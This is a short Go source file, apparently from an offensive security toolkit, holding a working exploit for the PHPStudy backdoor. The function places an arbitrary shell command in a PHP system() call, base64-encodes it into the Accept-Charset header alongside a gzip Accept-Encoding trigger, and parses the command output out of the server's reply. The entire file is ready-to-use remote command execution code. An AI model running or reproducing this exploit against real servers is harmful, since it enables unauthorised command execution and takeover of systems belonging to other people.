package exploit

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"

	"github.com/seaung/gagako/pkg/utils"
)

func ExploitPHPStudyDoor(url, cmd string) {
	client := &http.Client{}
	payloads := "echo '<result>'; " + "system(\"" + cmd + "\");" + "echo '</result>';"
	encodeString := base64.StdEncoding.EncodeToString([]byte(payloads))

	request, _ := http.NewRequest(http.MethodGet, url, nil)
	request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36")
	request.Header.Set("Connection", "keep-alive")
	request.Header.Set("Accept-Charset", encodeString)
	request.Header.Set("Accept-Encoding", "gzip,deflate")

	resp, err := client.Do(request)
	if err != nil {
		utils.New().LoggerError(fmt.Sprintf("Get Response body error : %v\n", err))
	}

	body, _ := ioutil.ReadAll(resp.Body)
	re := regexp.MustCompile(`<result>(?s:(.*?))</result>`)

	content := string(body)

	res := re.FindAllStringSubmatch(content, -1)

	for _, value := range res {
		utils.New().Success(fmt.Sprintf("the result : %s", value[1]))
	}
}
